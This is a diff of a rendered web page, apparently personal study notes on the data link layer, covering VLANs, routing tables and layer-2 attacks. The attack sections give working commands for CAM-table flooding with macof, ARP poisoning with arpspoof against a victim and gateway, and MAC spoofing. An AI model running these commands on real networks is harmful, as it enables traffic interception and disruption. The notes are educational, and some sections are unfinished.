@@ -11,7 +11,7 @@
   <link href="/css/style-classic.css"></link>
   
   
-  <link rel="stylesheet" href="/css/style.min.66ce8fff03ef375318be5d54765d5c0749bf4b361552834de057ae7105ddb079.css">
+  <link rel="stylesheet" href="/css/style.min.957e71ad2cb873132802e19798d6ca577b82e708fa80d1e90b00bc9e23855023.css">
   
 
   
@@ -277,19 +277,19 @@
 
 
   <div class="content" itemprop="articleBody">
-    <p><em>This is a protocol of TCP/IP suite, Data Link Layer. The first layer after physical layer is a data link layer and the protocol in use here is Ethernet II. Other protocols of this layer (not TCP/IP): . Network devices, protocols and attacks of the Data Link layer use a <strong>frame</strong> as a unit of information. The devices of this layer know nothing about IP addresses or TCP/UDP ports. They wouldn&rsquo;t know what to do with them since the protocols' headers only contain MAC addresses.  MAC addresses is all they know and care about.</em></p>
+    <p><em>This is a protocol of TCP/IP suite, Data Link Layer. The first layer after physical layer is a data link layer and the protocol in use here is Ethernet II. Other protocols of this layer (not TCP/IP): . Network devices, protocols and attacks of the Data Link layer use a <strong>frame</strong> as a unit of information. The devices of this layer know nothing about IP addresses or TCP/UDP ports. They wouldn&rsquo;t know what to do with them since the protocols&rsquo; headers only contain MAC addresses.  MAC addresses is all they know and care about.</em></p>
 <p>Each device in the network is recognized and identified by two basic pieces of information: IP address, MAC address. The service that is talking from that particular machine is recognized by TCP/UDP port and Application data (at the top of the OSI model).</p>
 <h2 id="vlan">VLAN</h2>
 <p>VLANs (broadcast domains) provide a way to separate LANs on the same switch. VLANs don&rsquo;t share broadcasts.</p>
 <h2 id="routing-tables">Routing tables</h2>
 <p>There are two different types of routes: local routes (directly connected to a switch or router) and those that use the default gateway. If a message is being sent to a computer that is identified in the computer&rsquo;s routing table, direct type of connection would be established. A gateway forwards messages coming from, or going to, external networks. Routing tables are maintained by all devices that are network connected (switches, routers, PCs, laptops etc). When Address Resolution Protocol (ARP) needs to send a message to a location that is outside its broadcast domain, it sends the message to the MAC address of the default gateway.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">netstat -nr <span class="c1"># Mac or Windows</span>
-ip route show <span class="c1"># router</span>
-
-tracepath
-traceroute
-tracert
-</code></pre></div><h2 id="four-causes-of-troubles">Four causes of troubles</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">netstat -nr <span class="c1"># Mac or Windows</span>
+</span></span><span class="line"><span class="cl">ip route show <span class="c1"># router</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">tracepath
+</span></span><span class="line"><span class="cl">traceroute
+</span></span><span class="line"><span class="cl">tracert
+</span></span></code></pre></div><h2 id="four-causes-of-troubles">Four causes of troubles</h2>
 <ol>
 <li>Collisions</li>
 <li>Signal reflection</li>
@@ -421,49 +421,48 @@ tracert
 </table>
 <p><strong>Flooding with 1 MAC</strong>. Send lots of ARP reply to constantly update 1 entry (race condition). Whenever the MAC in CAM table is substututed with the attacker&rsquo;s MAC, the responses will be redirected to the attacker. As soon as the victim sends a new request to some server through the switch, its MAC overwrites the attacker&rsquo;s. So it looks like a battle for 1 &ldquo;seat&rdquo;.</p>
 <p><strong>Flooding with different random MACs</strong>. Turning switch into a hub by flooding it with lots of ARP reply sending lots of random addresses and overflowing the CAM table. Uncapable of coping with such a flood, the switch is turned into a hub.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># flood with random MACs</span>
-macof -i eth1 -n10 
-
-<span class="c1"># targeted flooding</span>
-macof -i eth1 -d 192.168.1.1
-</code></pre></div><p><strong>Span port</strong>. This is an option that can be turned on in the switch&rsquo;s configs. Each request and response is copies and sent to the span port as well. Sometimes, switches only allow listening on the span port.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># flood with random MACs</span>
+</span></span><span class="line"><span class="cl">macof -i eth1 -n10 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># targeted flooding</span>
+</span></span><span class="line"><span class="cl">macof -i eth1 -d 192.168.1.1
+</span></span></code></pre></div><p><strong>Span port</strong>. This is an option that can be turned on in the switch&rsquo;s configs. Each request and response is copies and sent to the span port as well. Sometimes, switches only allow listening on the span port.</p>
 <p>CISCO config example</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">monitor session <span class="m">1</span> <span class="nb">source</span> interface fastethernet 0/1
-- <span class="nb">source</span> port <span class="k">for</span> monitoring
-monitor session <span class="m">1</span> destination interface fastethernet 0/24
-- destination port 
-</code></pre></div><p><strong>ARP poisoning</strong>. This attack poisons an ARP cache of a target machine. If attacker succeeds in overwriting an ARP entry for the default gateway with its own MAC, all traffic will be redirectied to the attacker.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">monitor session <span class="m">1</span> <span class="nb">source</span> interface fastethernet 0/1
+</span></span><span class="line"><span class="cl">- <span class="nb">source</span> port <span class="k">for</span> monitoring
+</span></span><span class="line"><span class="cl">monitor session <span class="m">1</span> destination interface fastethernet 0/24
+</span></span><span class="line"><span class="cl">- destination port 
+</span></span></code></pre></div><p><strong>ARP poisoning</strong>. This attack poisons an ARP cache of a target machine. If attacker succeeds in overwriting an ARP entry for the default gateway with its own MAC, all traffic will be redirectied to the attacker.</p>
 <p>ARP cache is not the same as CAM table.</p>
 <p><img src="images/1.png" alt="1"></p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># flood Bob (192.168.1.4) with ARP replies stating that the attacker has 192.168.1.1</span>
-arpspoof -i eth0 -t 192.168.1.4 192.168.1.1
-<span class="c1"># ARP cache of 192.168.1.4 is now as follows: cc:cc:cc:cc:cc:cc = 192.168.1.1.</span>
-
-<span class="c1"># flood the GW i.e. gateway (192.168.1.1) with ARP replies stating that the attacker has 192.168.1.4</span>
-arpspoof -i eth0 -t 192.168.1.1 192.168.1.4
-<span class="c1"># ARP cache of 192.168.1.1 is now as follows: cc:cc:cc:cc:cc:cc = 192.168.1.4.</span>
-
-</code></pre></div><p><strong>MAC spoofing</strong>. Change the attacker&rsquo;s original MAC to the victim&rsquo;s locally. For example, in the registry on a Windows machine:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\C</span>lass<span class="se">\4</span>d36e972-e325-11ce-bfc1-08002be103d8 SMAC
-</code></pre></div><p>Or in the command line (Linux):</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># disconnect from wlan1</span>
-ifconfig wlan1 down 
-<span class="c1"># or</span>
-ip link <span class="nb">set</span> wlan1 down
-
-<span class="c1"># * optionally</span>
-<span class="c1"># find MAC for specific vendor</span>
-macchanger -l 
-
-<span class="c1"># change mac for wlan1</span>
-macchanger -r wlan1
-macchanger -m aa:bb:cc:dd:ee:ff
-
-<span class="c1"># connect to wlan1 with the new MAC</span>
-ifconfig wlan1 up
-<span class="c1"># or </span>
-ip link <span class="nb">set</span> wlan1 up
-</code></pre></div><p><strong>IRDR spoofing</strong>. Send spoofed ICMP Router Discover Protocol advertising GW (gateway) to start routing through for victims.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># flood Bob (192.168.1.4) with ARP replies stating that the attacker has 192.168.1.1</span>
+</span></span><span class="line"><span class="cl">arpspoof -i eth0 -t 192.168.1.4 192.168.1.1
+</span></span><span class="line"><span class="cl"><span class="c1"># ARP cache of 192.168.1.4 is now as follows: cc:cc:cc:cc:cc:cc = 192.168.1.1.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># flood the GW i.e. gateway (192.168.1.1) with ARP replies stating that the attacker has 192.168.1.4</span>
+</span></span><span class="line"><span class="cl">arpspoof -i eth0 -t 192.168.1.1 192.168.1.4
+</span></span><span class="line"><span class="cl"><span class="c1"># ARP cache of 192.168.1.1 is now as follows: cc:cc:cc:cc:cc:cc = 192.168.1.4.</span>
+</span></span></code></pre></div><p><strong>MAC spoofing</strong>. Change the attacker&rsquo;s original MAC to the victim&rsquo;s locally. For example, in the registry on a Windows machine:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\C</span>lass<span class="se">\4</span>d36e972-e325-11ce-bfc1-08002be103d8 SMAC
+</span></span></code></pre></div><p>Or in the command line (Linux):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># disconnect from wlan1</span>
+</span></span><span class="line"><span class="cl">ifconfig wlan1 down 
+</span></span><span class="line"><span class="cl"><span class="c1"># or</span>
+</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> wlan1 down
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># * optionally</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># find MAC for specific vendor</span>
+</span></span><span class="line"><span class="cl">macchanger -l 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># change mac for wlan1</span>
+</span></span><span class="line"><span class="cl">macchanger -r wlan1
+</span></span><span class="line"><span class="cl">macchanger -m aa:bb:cc:dd:ee:ff
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># connect to wlan1 with the new MAC</span>
+</span></span><span class="line"><span class="cl">ifconfig wlan1 up
+</span></span><span class="line"><span class="cl"><span class="c1"># or </span>
+</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> wlan1 up
+</span></span></code></pre></div><p><strong>IRDR spoofing</strong>. Send spoofed ICMP Router Discover Protocol advertising GW (gateway) to start routing through for victims.</p>
 <h3 id="stp-mangling">STP-mangling</h3>
 <p>❓❓❓❓</p>
 <p>Attacker is elected as the new root bridge of the spanning tree:</p>
@@ -508,7 +507,7 @@ ip link <span class="nb">set</span> wlan1 up
   
 
   
-  <script type="text/javascript" src="/js/scripts.min.1237ff71925bb8625c97a9af8db4c54525258bedfd7c47493daaff723bea755e.js"></script>
+  <script type="text/javascript" src="/js/scripts.min.bafc052229b4b40bf03c477d31c5cdd9352ece8afbadf35ab97ed14495098fc9.js"></script>
   
 
   
